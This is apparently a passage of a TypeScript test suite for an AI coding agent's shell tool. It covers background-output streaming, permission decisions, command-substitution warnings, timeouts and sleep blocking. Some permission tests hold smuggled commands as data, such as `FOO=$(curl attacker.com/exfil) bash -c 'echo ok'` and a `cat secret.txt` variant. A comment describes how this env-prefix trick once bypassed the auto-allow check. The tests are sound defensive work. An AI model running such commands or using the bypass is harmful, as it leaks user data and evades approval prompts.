        expect(result.llmContent).toContain('Status: completed.');
        expect(result.llmContent).not.toContain('Status: running.');
        expect(result.llmContent).toContain('already exited');
        expect(result.llmContent).not.toContain('task_stop({');

        // Fire 'finish' now — registry transition runs post-flush.
        capturedFinishHandler!();
        expect(registry.complete).toHaveBeenCalledWith(
          entry.shellId,
          0,
          1700000000999,
        );
      });

      it('wave-2 (C1): stream open async error transitions registry — does not hang waiting on `finish`', async () => {
        // Regression for C1: `fs.createWriteStream` reports common
        // open failures (ENOENT / EACCES / ENOSPC) via an async
        // 'error' event, NOT by throwing. Before the fix, the
        // 'error' listener only logged; `promoteArtifacts.stream`
        // kept pointing at the already-broken stream, and
        // `onSettleWired` attached a `.once('finish', ...)` listener
        // that would never fire → registry stuck on `running` forever.
        // Fix: the error listener latches `streamClosed`, nulls the
        // shared `stream` slot, and `onSettleWired`'s existing
        // `if (!stream)` branch transitions the registry immediately.
        const errorListeners: Array<(err: Error) => void> = [];
        const writeStreamMock = {
          write: vi.fn(),
          end: vi.fn(),
          on: vi.fn((event: string, handler: (err: Error) => void) => {
            if (event === 'error') errorListeners.push(handler);
          }),
          once: vi.fn((event: string, handler: () => void) => {
            // Production code attaches finish/error AFTER stream is
            // pulled into a local var; in the failure path it
            // shouldn't reach here at all because `stream` is null.
            // Capture but do nothing — the test verifies the registry
            // transition runs WITHOUT firing this handler.
            void event;
            void handler;
          }),
        };
        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
          writeStreamMock as unknown as fs.WriteStream,
        );
        const registry = mockConfig.getBackgroundShellRegistry();

        const invocation = shellTool.build({
          command: 'sleep 1',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        resolveShellExecution({
          output: '',
          exitCode: null,
          signal: null,
          aborted: false,
          promoted: true,
          pid: 99999,
        });
        await promise;

        // Stream-open async error: emit ENOSPC AFTER stream is
        // assigned to `promoteArtifacts.stream`. The latch nulls
        // the shared slot.
        expect(errorListeners.length).toBeGreaterThan(0);
        errorListeners[0](
          Object.assign(new Error('disk full'), { code: 'ENOSPC' }),
        );

        // Now drive onSettle — the wired handler sees
        // `promoteArtifacts.stream === null` and transitions
        // immediately (no finish wait), so the entry doesn't stay
        // running.
        const serviceCall = mockShellExecutionService.mock.calls[0];
        const onSettle = (
          serviceCall[6] as {
            postPromote: {
              onSettle: (info: {
                exitCode: number | null;
                signal: number | null;
                error?: Error;
                endTime: number;
              }) => void;
            };
          }
        ).postPromote.onSettle;
        onSettle({ exitCode: 0, signal: null, endTime: 1700000111111 });

        const entry = (registry.register as Mock).mock.calls[0][0];
        expect(registry.complete).toHaveBeenCalledWith(
          entry.shellId,
          0,
          1700000111111,
        );
      });

      it('stream open async error writes diagnostic marker via appendFileSync', async () => {
        const errorListeners: Array<(err: Error) => void> = [];
        const writeStreamMock = {
          write: vi.fn(),
          end: vi.fn(),
          on: vi.fn((event: string, handler: (err: Error) => void) => {
            if (event === 'error') errorListeners.push(handler);
          }),
          once: vi.fn(),
        };
        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
          writeStreamMock as unknown as fs.WriteStream,
        );

        const invocation = shellTool.build({
          command: 'sleep 1',
          is_background: false,
        });
        const promise = invocation.execute(mockAbortSignal);
        resolveShellExecution({
          output: '',
          exitCode: null,
          signal: null,
          aborted: false,
          promoted: true,
          pid: 99998,
        });
        await promise;

        errorListeners[0](
          Object.assign(new Error('disk full'), { code: 'ENOSPC' }),
        );

        expect(fs.appendFileSync).toHaveBeenCalledWith(
          expect.stringContaining('bg_'),
          expect.stringContaining('[WARNING: post-promote output lost'),
        );
      });

      it('flush timeout transitions registry when stream.finish never fires', async () => {
        vi.useFakeTimers();
        try {
          const writeStreamMock = {
            write: vi.fn(),
            end: vi.fn(),
            on: vi.fn(),
            once: vi.fn(),
          };
          vi.mocked(fs.createWriteStream).mockReturnValueOnce(
            writeStreamMock as unknown as fs.WriteStream,
          );
          const registry = mockConfig.getBackgroundShellRegistry();

          const invocation = shellTool.build({
            command: 'sleep 1',
            is_background: false,
          });
          const promise = invocation.execute(mockAbortSignal);
          resolveShellExecution({
            output: '',
            exitCode: null,
            signal: null,
            aborted: false,
            promoted: true,
            pid: 99997,
          });
          await promise;

          const serviceCall = mockShellExecutionService.mock.calls[0];
          const onSettle = (
            serviceCall[6] as {
              postPromote: {
                onSettle: (info: {
                  exitCode: number | null;
                  signal: number | null;
                  error?: Error;
                  endTime: number;
                }) => void;
              };
            }
          ).postPromote.onSettle;

          onSettle({ exitCode: 0, signal: null, endTime: 1700000222222 });

          // stream.once('finish') was NOT fired — registry should
          // NOT have transitioned yet.
          expect(registry.complete).not.toHaveBeenCalled();

          // Advance past the 10s flush timeout.
          vi.advanceTimersByTime(10_001);

          const entry = (registry.register as Mock).mock.calls[0][0];
          expect(registry.complete).toHaveBeenCalledWith(
            entry.shellId,
            0,
            1700000222222,
          );
        } finally {
          vi.useRealTimers();
        }
      });

      it('wave-3 (T2): onSettleWired drains pre-settle buffer AND latches streamClosed so post-end chunks drop instead of leaking the buffer', async () => {
        // Regression for the buffer-drain race: previously
        // `onSettleWired` set `promoteArtifacts.stream = null` BEFORE
        // calling `stream.end()`. Any `onData` chunk that arrived
        // between the null assignment and the `'finish'` event saw
        // `stream === null && streamClosed === false` and pushed
        // into `promoteArtifacts.buffer` — which has no further
        // drain path (the foreground finalizer has already
        // returned). Result: chunks stranded forever, no
        // observability. Fix drains the buffer to the stream BEFORE
        // nulling AND latches `streamClosed=true` so any subsequent
        // chunks DROP via the third branch of `onData` instead.
        const writeStreamMock = {
          write: vi.fn(),
          end: vi.fn(),
          on: vi.fn(),
          once: vi.fn(),
        };
        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
          writeStreamMock as unknown as fs.WriteStream,
        );

        let capturedPostPromote:
          | {
              onData?: (event: {
                type: string;
                chunk: string | unknown;
              }) => void;
              onSettle?: (info: {
                exitCode: number | null;
                signal: number | null;
                error?: Error;
                endTime: number;
              }) => void;
            }
          | undefined;
        mockShellExecutionService.mockImplementationOnce(
          (...args: unknown[]) => {
            const opts = args[6] as {
              postPromote?: typeof capturedPostPromote;
            };
            capturedPostPromote = opts?.postPromote;
            return {
              pid: 55555,
              result: Promise.resolve({
                rawOutput: Buffer.from(''),
                output: 'snapshot',
                exitCode: null,
                signal: null,
                aborted: false,
                promoted: true,
                pid: 55555,
                executionMethod: 'child_process',
                error: null,
              }),
            };
          },
        );

        const invocation = shellTool.build({
          command: 'sleep 1',
          is_background: false,
        });
        // Fire a pre-settle data chunk BEFORE awaiting — it lands
        // in the pre-finalizer service-side window. Then await the
        // execute (handlePromotedForeground completes, drains the
        // buffer into stream, wires onSettleWired).
        const promise = invocation.execute(mockAbortSignal);
        // The service-side mock has been called by now (synchronous
        // up to the resolved promise return); fire onData on its
        // captured postPromote.
        await new Promise((resolve) => setImmediate(resolve));
        // First chunk: arrives BEFORE handlePromotedForeground opens
        // the stream → buffered in `promoteArtifacts.buffer`. After
        // handlePromotedForeground drains, this gets written.
        capturedPostPromote?.onData?.({ type: 'data', chunk: 'pre1' });
        await promise;

        // After handlePromotedForeground: stream is non-null and
        // pre1 has been written into it (drained from buffer).
        expect(writeStreamMock.write).toHaveBeenCalledWith('pre1');

        // Now push a chunk that lands between handlePromotedForeground
        // and settle (still buffered in the service-side window).
        // Since handlePromotedForeground has already opened the stream
        // and drained, this chunk goes straight through stream.write.
        capturedPostPromote?.onData?.({ type: 'data', chunk: 'mid1' });
        expect(writeStreamMock.write).toHaveBeenCalledWith('mid1');

        // Fire settle. onSettleWired now drains any remaining buffer,
        // nulls stream, latches streamClosed.
        capturedPostPromote?.onSettle?.({
          exitCode: 0,
          signal: null,
          endTime: 1700001111111,
        });

        // POST-SETTLE chunks (kernel buffer race) — must DROP, not
        // accumulate in the buffer. Before the wave-3 fix this would
        // push into `promoteArtifacts.buffer` and leak.
        capturedPostPromote?.onData?.({ type: 'data', chunk: 'post1' });
        capturedPostPromote?.onData?.({ type: 'data', chunk: 'post2' });

        // Stream.write should NOT have been called for post-settle
        // chunks (stream is null + streamClosed latched → onData's
        // third branch drops).
        const writeCalls = writeStreamMock.write.mock.calls.map(
          (c: unknown[]) => c[0],
        );
        expect(writeCalls).not.toContain('post1');
        expect(writeCalls).not.toContain('post2');
      });

      it('wave-3 (T3): catch-path clears the buffered chunks and falls back to writeFileSync(snapshot)', async () => {
        // Regression for the silent-drop critique: when
        // createWriteStream throws (rare, but ENOENT on a vanished
        // tmpdir is plausible), chunks already in
        // `promoteArtifacts.buffer` cannot be salvaged. The fix
        // empties the buffer (so any later code paths can't see
        // stale chunks) and logs the count for oncall observability
        // (the log itself is verified by `debugLogger` integration —
        // not asserted here because debugLogger has no global
        // session in test setup, so the log is a side-effect-only
        // observability tool). Behaviorally the test verifies that
        // (a) writeFileSync snapshot fallback runs, (b) the path
        // does not crash, (c) a post-buffer-drain settle still
        // transitions the registry.
        vi.mocked(fs.createWriteStream).mockImplementationOnce(() => {
          throw Object.assign(new Error('ENOENT no tmpdir'), {
            code: 'ENOENT',
          });
        });
        // Spy on writeFileSync (the snapshot fallback) — passthrough
        // implementation since the default mock would be no-op.
        const writeFileSyncSpy = vi
          .mocked(fs.writeFileSync)
          .mockImplementationOnce(() => undefined);

        const registry = mockConfig.getBackgroundShellRegistry();
        let capturedPostPromote:
          | {
              onData?: (event: { type: string; chunk: unknown }) => void;
              onSettle?: (info: {
                exitCode: number | null;
                signal: number | null;
                error?: Error;
                endTime: number;
              }) => void;
            }
          | undefined;
        mockShellExecutionService.mockImplementationOnce(
          (...args: unknown[]) => {
            const opts = args[6] as {
              postPromote?: typeof capturedPostPromote;
            };
            capturedPostPromote = opts?.postPromote;
            // Fire 3 pre-finalizer chunks → all queue in buffer.
            capturedPostPromote?.onData?.({ type: 'data', chunk: 'a' });
            capturedPostPromote?.onData?.({ type: 'data', chunk: 'b' });
            capturedPostPromote?.onData?.({ type: 'data', chunk: 'c' });
            return {
              pid: 44444,
              result: Promise.resolve({
                rawOutput: Buffer.from(''),
                output: 'snap',
                exitCode: null,
                signal: null,
                aborted: false,
                promoted: true,
                pid: 44444,
                executionMethod: 'child_process',
                error: null,
              }),
            };
          },
        );

        const invocation = shellTool.build({
          command: 'whatever',
          is_background: false,
        });
        await invocation.execute(mockAbortSignal);

        // writeFileSync called with the snapshot (the recoverable
        // fallback).
        expect(writeFileSyncSpy).toHaveBeenCalledWith(
          expect.any(String),
          'snap',
        );

        // Post-settle chunks must not surface anywhere either —
        // streamClosed was set by the catch path so subsequent
        // onData chunks drop. Drive a settle, then a late chunk;
        // verify the registry still transitions normally and the
        // late chunk is dropped without crashing.
        capturedPostPromote?.onSettle?.({
          exitCode: 0,
          signal: null,
          endTime: 1700002222222,
        });
        capturedPostPromote?.onData?.({ type: 'data', chunk: 'post-settle' });

        const entry = (registry.register as Mock).mock.calls[0][0];
        expect(registry.complete).toHaveBeenCalledWith(
          entry.shellId,
          0,
          1700002222222,
        );
      });

      it('wave-4 (T4): post-promote `onData` chunks have ANSI stripped before write (matches executeBackground file format)', async () => {
        // Regression for the format-mismatch critique: the regular
        // `executeBackground` path strips ANSI before writing to the
        // background output file, but the promoted-foreground onData
        // path used to write raw chunks. After Ctrl+B, the file would
        // be plain text up to the snapshot then raw `\x1b[31m` /
        // cursor-move / clear-screen sequences for the post-promote
        // tail — unreadable for an agent that just `Read`s the file.
        // Fix applies stripAnsi() in onData before writing/buffering.
        const writeStreamMock = {
          write: vi.fn(),
          end: vi.fn(),
          on: vi.fn(),
          once: vi.fn((event: string, handler: () => void) => {
            if (event === 'finish') handler();
          }),
        };
        vi.mocked(fs.createWriteStream).mockReturnValueOnce(
          writeStreamMock as unknown as fs.WriteStream,
        );

        let capturedPostPromote:
          | {
              onData?: (event: { type: string; chunk: unknown }) => void;
              onSettle?: (info: {
                exitCode: number | null;
                signal: number | null;
                error?: Error;
                endTime: number;
              }) => void;
            }
          | undefined;
        mockShellExecutionService.mockImplementationOnce(
          (...args: unknown[]) => {
            const opts = args[6] as {
              postPromote?: typeof capturedPostPromote;
            };
            capturedPostPromote = opts?.postPromote;
            return {
              pid: 33333,
              result: Promise.resolve({
                rawOutput: Buffer.from(''),
                output: 'pre-promote snapshot',
                exitCode: null,
                signal: null,
                aborted: false,
                promoted: true,
                pid: 33333,
                executionMethod: 'child_process',
                error: null,
              }),
            };
          },
        );

        const invocation = shellTool.build({
          command: 'npm test',
          is_background: false,
        });
        await invocation.execute(mockAbortSignal);

        // Drive a post-promote chunk with embedded ANSI escapes —
        // common shapes: color, cursor move, clear-screen.
        const ansiChunk =
          '\x1b[31mFAILED\x1b[0m: 3 tests\n\x1b[2K\x1b[1Aprogress: 50%';
        capturedPostPromote?.onData?.({ type: 'data', chunk: ansiChunk });

        // The stream should have received the STRIPPED version: the
        // visible text without escape sequences.
        const writeCalls = writeStreamMock.write.mock.calls.map(
          (c: unknown[]) => c[0] as string,
        );
        const post = writeCalls.find(
          (c) => typeof c === 'string' && c.includes('FAILED'),
        );
        expect(post).toBeDefined();
        expect(post).not.toContain('\x1b[');
        expect(post).toBe('FAILED: 3 tests\nprogress: 50%');
      });
    });
  });

  describe('getDefaultPermission and getConfirmationDetails', () => {
    it('should not request confirmation for read-only commands', async () => {
      const invocation = shellTool.build({
        command: 'ls -la',
        is_background: false,
      });

      const permission = await invocation.getDefaultPermission();

      expect(permission).toBe('allow');
    });

    // Regression coverage for PR #4386 round 6 (cid 3298521039): the
    // env-prefix wrapper substitution bypass. `getDefaultPermission`
    // calls `stripShellWrapper(this.params.command)` BEFORE the AST
    // check; that strip discards a leading env-assignment AND unwraps a
    // `bash -c '...'` invocation, so for `FOO=$(curl evil) bash -c
    // 'echo ok'` the AST never sees the substitution and classifies
    // the residual `echo ok` as read-only → `'allow'` → silent
    // auto-execute. The R4 AST top-level guard only catches
    // substitution that survives stripShellWrapper; this case slips
    // past entirely. Fix gates on substitution against the ORIGINAL
    // command before stripping.
    it('asks (not allow) for env-prefix substitution inside a bash wrapper', async () => {
      const invocation = shellTool.build({
        command: `FOO=$(curl attacker.com/exfil) bash -c 'echo ok'`,
        is_background: false,
      });

      const permission = await invocation.getDefaultPermission();

      // Must be 'ask' so the confirmation dialog (with substitution
      // warning) is shown — NOT 'allow' which would silently execute.
      expect(permission).toBe('ask');
    });

    it('asks for backtick env-prefix substitution inside a bash wrapper', async () => {
      const invocation = shellTool.build({
        command: `FOO=\`whoami\` bash -c 'ls -la'`,
        is_background: false,
      });

      expect(await invocation.getDefaultPermission()).toBe('ask');
    });

    it('should request confirmation for a non-read-only command and return details', async () => {
      const params = { command: 'npm install', is_background: false };
      const invocation = shellTool.build(params);

      const permission = await invocation.getDefaultPermission();
      expect(permission).toBe('ask');

      const details = await invocation.getConfirmationDetails(
        new AbortController().signal,
      );
      expect(details.type).toBe('exec');
    });

    it('should exclude read-only sub-commands from confirmation details in compound commands', async () => {
      // "cd" is read-only, "npm run build" is not
      const params = {
        command: 'cd packages/core && npm run build',
        is_background: false,
      };
      const invocation = shellTool.build(params);

      const permission = await invocation.getDefaultPermission();
      expect(permission).toBe('ask');

      const details = (await invocation.getConfirmationDetails(
        new AbortController().signal,
      )) as { rootCommand: string; permissionRules: string[] };

      // rootCommand should only include 'npm', not 'cd'
      expect(details.rootCommand).not.toContain('cd');
      expect(details.rootCommand).toContain('npm');

      // permissionRules should not include Bash(cd *)
      expect(details.permissionRules).not.toContainEqual(
        expect.stringContaining('cd'),
      );
      expect(details.permissionRules).toContainEqual(
        expect.stringContaining('npm'),
      );
    });

    it('should not surface file descriptor redirects as standalone commands in confirmation details', async () => {
      const params = {
        command: 'npm run build 2>&1 | head -100',
        is_background: false,
      };
      const invocation = shellTool.build(params);

      const permission = await invocation.getDefaultPermission();
      expect(permission).toBe('ask');

      const details = (await invocation.getConfirmationDetails(
        new AbortController().signal,
      )) as { rootCommand: string; permissionRules: string[] };

      expect(details.rootCommand).toBe('npm');
      expect(details.permissionRules).toEqual(['Bash(npm run *)']);
    });

    it('should exclude already-allowed sub-commands from confirmation details in compound commands', async () => {
      const pm = new PermissionManager({
        getPermissionsAllow: () => ['Bash(git add *)'],
        getPermissionsAsk: () => [],
        getPermissionsDeny: () => [],
        getProjectRoot: () => '/test/dir',
        getCwd: () => '/test/dir',
      });
      pm.initialize();
      (mockConfig.getPermissionManager as Mock).mockReturnValue(pm);

      const invocation = shellTool.build({
        command: 'git add /tmp/file && git commit -m "msg"',
        is_background: false,
      });

      const details = (await invocation.getConfirmationDetails(
        new AbortController().signal,
      )) as { rootCommand: string; permissionRules: string[] };

      expect(details.rootCommand).toBe('git');
      expect(details.permissionRules).toEqual(['Bash(git commit *)']);
    });

    it('should pass the invocation directory to permission-manager command checks', async () => {
      const pm = {
        isCommandAllowed: vi.fn().mockResolvedValue('ask'),
      } as unknown as PermissionManager;
      (mockConfig.getPermissionManager as Mock).mockReturnValue(pm);

      const invocation = shellTool.build({
        command: 'git commit -m "msg"',
        directory: '/test/dir/subdir',
        is_background: false,
      });

      await invocation.getConfirmationDetails(new AbortController().signal);

      expect(pm.isCommandAllowed).toHaveBeenCalledWith(
        'git commit -m "msg"',
        '/test/dir/subdir',
      );
    });

    it('should throw an error if validation fails', async () => {
      expect(() =>
        shellTool.build({ command: '', is_background: false }),
      ).toThrow();
    });

    // Regression coverage for issue #4093: command substitution must be
    // visibly flagged in the confirmation prompt rather than silently
    // denied. See ShellToolInvocation.getConfirmationDetails for context.
    describe('command substitution warning (issue #4093)', () => {
      it('surfaces a warning for $() command substitution', async () => {
        const invocation = shellTool.build({
          command: 'python3 -c "print($(echo hello))"',
          is_background: false,
        });
        const details = (await invocation.getConfirmationDetails(
          new AbortController().signal,
        )) as { warnings?: string[] };

        expect(details.warnings).toBeDefined();
        expect(details.warnings).toHaveLength(1);
        expect(details.warnings?.[0]).toMatch(/command substitution/i);
      });

      it('surfaces a warning for backtick command substitution', async () => {
        const invocation = shellTool.build({
          command: 'echo `whoami`',
          is_background: false,
        });
        const details = (await invocation.getConfirmationDetails(
          new AbortController().signal,
        )) as { warnings?: string[] };

        expect(details.warnings?.[0]).toMatch(/command substitution/i);
      });

      it('surfaces a warning for <() process substitution', async () => {
        const invocation = shellTool.build({
          command: 'diff <(ls /a) <(ls /b)',
          is_background: false,
        });
        const details = (await invocation.getConfirmationDetails(
          new AbortController().signal,
        )) as { warnings?: string[] };

        expect(details.warnings?.[0]).toMatch(/command substitution/i);
      });

      it('surfaces a warning for >() output process substitution', async () => {
        const invocation = shellTool.build({
          command: 'echo data > >(tee log.txt)',
          is_background: false,
        });
        const details = (await invocation.getConfirmationDetails(
          new AbortController().signal,
        )) as { warnings?: string[] };

        expect(details.warnings?.[0]).toMatch(/command substitution/i);
      });

      it('does not set warnings on commands without substitution', async () => {
        const invocation = shellTool.build({
          command: 'npm install',
          is_background: false,
        });
        const details = (await invocation.getConfirmationDetails(
          new AbortController().signal,
        )) as { warnings?: string[] };

        // `warnings` should be omitted entirely when there's nothing to flag.
        expect(details.warnings).toBeUndefined();
      });

      // Regression coverage for PR #4386 R4 (cid 3293075622): the
      // `|| detectCommandSubstitution(rawCommand)` branch of
      // `buildShellExecWarnings` only fires for shapes where
      // `stripShellWrapper` yields a substitution-free inner command
      // (here `echo ok`) but the raw command has substitution in the
      // env-prefix. Without this case, removing the `||` clause would
      // not regress any test in this describe block.
      it('surfaces a warning for substitution in the env-prefix of a shell wrapper', async () => {
        const invocation = shellTool.build({
          command: `FOO=$(cat secret.txt) bash -c 'echo ok'`,
          is_background: false,
        });
        const details = (await invocation.getConfirmationDetails(
          new AbortController().signal,
        )) as { warnings?: string[] };

        expect(details.warnings).toBeDefined();
        expect(details.warnings?.[0]).toMatch(/command substitution/i);
      });
    });
  });

  describe('getDescription', () => {
    const originalEnv = { ...process.env };

    afterEach(() => {
      process.env = { ...originalEnv };
    });

    it('should return the windows description when on windows', async () => {
      vi.mocked(os.platform).mockReturnValue('win32');
      delete process.env['ComSpec'];
      delete process.env['MSYSTEM'];
      delete process.env['TERM'];
      const shellTool = new ShellTool(mockConfig);
      expect(shellTool.description).toMatchSnapshot();
      expect(shellTool.description).toContain(
        "Use '&' only when you need to run commands sequentially",
      );
      expect(shellTool.description).toContain(
        "DO NOT use ';' or newlines to separate commands in cmd.exe.",
      );
      expect(getCommandParameterDescription(shellTool)).toBe(
        'Exact cmd.exe command to execute as `cmd.exe /d /s /c <command>`',
      );
    });

    it('should return the non-windows description when not on windows', async () => {
      vi.mocked(os.platform).mockReturnValue('linux');
      const shellTool = new ShellTool(mockConfig);
      expect(shellTool.description).toMatchSnapshot();
      expect(getCommandParameterDescription(shellTool)).toBe(
        'Exact bash command to execute as `bash -c <command>`',
      );
    });

    it('should describe PowerShell when ComSpec points to powershell.exe', async () => {
      vi.mocked(os.platform).mockReturnValue('win32');
      process.env['ComSpec'] =
        'C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
      delete process.env['MSYSTEM'];
      delete process.env['TERM'];

      const shellTool = new ShellTool(mockConfig);

      expect(shellTool.description).toContain(
        '`powershell.exe -NoProfile -Command <command>`',
      );
      expect(shellTool.description).toContain(
        'The active shell is PowerShell.',
      );
      expect(shellTool.description).toContain(
        'Do NOT use Bash-only forms such as ANSI-C quoting',
      );
      expect(shellTool.description).toContain(
        "Windows PowerShell does not support '&&'.",
      );
      expect(shellTool.description).not.toContain(
        "use a single run_shell_command call with '&&'",
      );
      expect(getCommandParameterDescription(shellTool)).toBe(
        'Exact PowerShell command to execute as `powershell.exe -NoProfile -Command <command>`',
      );
    });

    it('should describe pwsh when ComSpec points to pwsh.exe', async () => {
      vi.mocked(os.platform).mockReturnValue('win32');
      process.env['ComSpec'] = 'C:\\Program Files\\PowerShell\\7\\pwsh.exe';
      delete process.env['MSYSTEM'];
      delete process.env['TERM'];

      const shellTool = new ShellTool(mockConfig);

      expect(shellTool.description).toContain(
        '`pwsh.exe -NoProfile -Command <command>`',
      );
      expect(shellTool.description).toContain(
        "use a single run_shell_command call with '&&'",
      );
      expect(getCommandParameterDescription(shellTool)).toBe(
        'Exact PowerShell command to execute as `pwsh.exe -NoProfile -Command <command>`',
      );
    });

    it('should describe bash when Windows is running in Git Bash', async () => {
      vi.mocked(os.platform).mockReturnValue('win32');
      process.env['ComSpec'] = 'C:\\WINDOWS\\System32\\cmd.exe';
      process.env['MSYSTEM'] = 'MINGW64';
      delete process.env['TERM'];

      const shellTool = new ShellTool(mockConfig);

      expect(shellTool.description).toContain('`bash -c <command>`');
      expect(shellTool.description).toContain('The active shell is Bash.');
      expect(shellTool.description).toContain('ANSI-C quoting');
      expect(shellTool.description).not.toContain(
        'Command process group can be terminated',
      );
      expect(getCommandParameterDescription(shellTool)).toBe(
        'Exact bash command to execute as `bash -c <command>`',
      );
    });
  });

  describe('timeout parameter', () => {
    it('should validate timeout parameter correctly', async () => {
      // Valid timeout
      expect(() => {
        shellTool.build({
          command: 'echo test',
          is_background: false,
          timeout: 5000,
        });
      }).not.toThrow();

      // Valid small timeout
      expect(() => {
        shellTool.build({
          command: 'echo test',
          is_background: false,
          timeout: 500,
        });
      }).not.toThrow();

      // Zero timeout
      expect(() => {
        shellTool.build({
          command: 'echo test',
          is_background: false,
          timeout: 0,
        });
      }).toThrow('Timeout must be a positive number.');

      // Negative timeout
      expect(() => {
        shellTool.build({
          command: 'echo test',
          is_background: false,
          timeout: -1000,
        });
      }).toThrow('Timeout must be a positive number.');

      // Timeout too large
      expect(() => {
        shellTool.build({
          command: 'echo test',
          is_background: false,
          timeout: 700000,
        });
      }).toThrow('Timeout cannot exceed 600000ms (10 minutes).');

      // Non-integer timeout
      expect(() => {
        shellTool.build({
          command: 'echo test',
          is_background: false,
          timeout: 5000.5,
        });
      }).toThrow('Timeout must be an integer number of milliseconds.');

      // Non-number timeout (schema validation catches this first)
      expect(() => {
        shellTool.build({
          command: 'echo test',
          is_background: false,
          timeout: 'invalid' as unknown as number,
        });
      }).toThrow('params/timeout must be number');
    });

    it('should include timeout in description for foreground commands', async () => {
      const invocation = shellTool.build({
        command: 'npm test',
        is_background: false,
        timeout: 30000,
      });

      expect(invocation.getDescription()).toBe('npm test [timeout: 30000ms]');
    });

    it('should not include timeout in description for background commands', async () => {
      const invocation = shellTool.build({
        command: 'npm start',
        is_background: true,
        timeout: 30000,
      });

      expect(invocation.getDescription()).toBe('npm start [background]');
    });

    it('should create combined signal with timeout for foreground execution', async () => {
      const mockAbortSignal = new AbortController().signal;
      const invocation = shellTool.build({
        command: 'sleep 1',
        is_background: false,
        timeout: 5000,
      });

      const promise = invocation.execute(mockAbortSignal);

      resolveExecutionPromise({
        rawOutput: Buffer.from(''),
        output: '',
        exitCode: 0,
        signal: null,
        error: null,
        aborted: false,
        pid: 12345,
        executionMethod: 'child_process',
      });

      await promise;

      // Verify that ShellExecutionService was called with a combined signal
      expect(mockShellExecutionService).toHaveBeenCalledWith(
        expect.any(String),
        expect.any(String),
        expect.any(Function),
        expect.any(AbortSignal),
        false,
        expect.objectContaining({}),

        expect.objectContaining({ postPromote: expect.any(Object) }),
      );

      // The signal passed should be different from the original signal
      const calledSignal = mockShellExecutionService.mock.calls[0][3];
      expect(calledSignal).not.toBe(mockAbortSignal);
    });

    it('should handle timeout vs user cancellation correctly', async () => {
      const userAbortController = new AbortController();
      const invocation = shellTool.build({
        command: 'long-running-command',
        is_background: false,
        timeout: 5000,
      });

      // Mock AbortSignal.timeout and AbortSignal.any
      const mockTimeoutSignal = {
        aborted: false,
        addEventListener: vi.fn(),
        removeEventListener: vi.fn(),
      } as unknown as AbortSignal;

      const mockCombinedSignal = {
        aborted: true,
        addEventListener: vi.fn(),
        removeEventListener: vi.fn(),
      } as unknown as AbortSignal;

      const originalAbortSignal = globalThis.AbortSignal;
      vi.stubGlobal('AbortSignal', {
        ...originalAbortSignal,
        timeout: vi.fn().mockReturnValue(mockTimeoutSignal),
        any: vi.fn().mockReturnValue(mockCombinedSignal),
      });

      const promise = invocation.execute(userAbortController.signal);

      resolveExecutionPromise({
        rawOutput: Buffer.from('partial output'),
        output: 'partial output',
        exitCode: null,
        signal: null,
        error: null,
        aborted: true,
        pid: 12345,
        executionMethod: 'child_process',
      });

      const result = await promise;

      // Restore original AbortSignal
      vi.stubGlobal('AbortSignal', originalAbortSignal);

      expect(result.llmContent).toContain('Command timed out after 5000ms');
      expect(result.llmContent).toContain(
        'Below is the output before it timed out',
      );
    });

    it('should use default timeout behavior when timeout is not specified', async () => {
      const mockAbortSignal = new AbortController().signal;
      const invocation = shellTool.build({
        command: 'echo test',
        is_background: false,
      });

      const promise = invocation.execute(mockAbortSignal);

      resolveExecutionPromise({
        rawOutput: Buffer.from('test'),
        output: 'test',
        exitCode: 0,
        signal: null,
        error: null,
        aborted: false,
        pid: 12345,
        executionMethod: 'child_process',
      });

      await promise;

      // Should create a combined signal with the default timeout when no timeout is specified
      expect(mockShellExecutionService).toHaveBeenCalledWith(
        expect.any(String),
        expect.any(String),
        expect.any(Function),
        expect.any(AbortSignal),
        false,
        expect.objectContaining({}),

        expect.objectContaining({ postPromote: expect.any(Object) }),
      );
    });
  });
});

describe('parseNumstat', () => {
  it('parses text-diff entries as (additions + deletions) * 40', () => {
    // Format: "<adds>\t<dels>\t<path>"
    const out = '2\t3\tsrc/main.ts';
    expect(parseNumstat(out).get('src/main.ts')).toBe(200);
  });

  it('uses a fixed fallback for binary entries (- - path)', () => {
    const out = ['-\t-\tassets/logo.png', '5\t0\tsrc/main.ts'].join('\n');
    const sizes = parseNumstat(out);
    // Binary file still lands in the map so attribution doesn't drop
    // it via diffSize=0; exact size doesn't matter, the constant just
    // needs to be > 0.
    expect(sizes.get('assets/logo.png')).toBeGreaterThan(0);
    expect(sizes.get('src/main.ts')).toBe(200);
  });

  it('normalizes brace rename notation to the new path', () => {
    const out = '3\t1\tsrc/{old => new}/file.ts';
    expect([...parseNumstat(out).keys()]).toEqual(['src/new/file.ts']);
  });

  it('normalizes bare cross-directory rename to the new path', () => {
    const out = '1\t1\told/dir/file.ts => new/dir/file.ts';
    expect([...parseNumstat(out).keys()]).toEqual(['new/dir/file.ts']);
  });

  it('ignores malformed lines instead of crashing', () => {
    const out = [
      '',
      'garbage line',
      '5\t2\tsrc/ok.ts',
      'a\tb\tsrc/bad.ts',
    ].join('\n');
    const sizes = parseNumstat(out);
    expect([...sizes.keys()]).toEqual(['src/ok.ts']);
  });
});

describe('detectBlockedSleepPattern', () => {
  it('blocks standalone sleep >= 2s', () => {
    expect(detectBlockedSleepPattern('sleep 5')).toBe('standalone sleep 5');
    expect(detectBlockedSleepPattern('sleep 10')).toBe('standalone sleep 10');
    expect(detectBlockedSleepPattern('sleep 2.5')).toBe('standalone sleep 2.5');
    expect(detectBlockedSleepPattern('sleep 2s')).toBe('standalone sleep 2s');
    expect(detectBlockedSleepPattern('sleep 2000ms')).toBe(
      'standalone sleep 2000ms',
    );
    expect(detectBlockedSleepPattern('sleep 3m')).toBe('standalone sleep 3m');
  });

  it('blocks sleep followed by another command', () => {
    expect(detectBlockedSleepPattern('sleep 5 && curl http://localhost')).toBe(
      'sleep 5 followed by: curl http://localhost',
    );
    expect(detectBlockedSleepPattern('sleep 3; echo done')).toBe(
      'sleep 3 followed by: echo done',
    );
    expect(detectBlockedSleepPattern('sleep 2.5 || echo done')).toBe(
      'sleep 2.5 followed by: echo done',
    );
    expect(detectBlockedSleepPattern('sleep 2s\necho done')).toBe(
      'sleep 2s followed by: echo done',
    );
  });

  it('allows sleep < 2s', () => {
    expect(detectBlockedSleepPattern('sleep 1')).toBeNull();
    expect(detectBlockedSleepPattern('sleep 0')).toBeNull();
  });

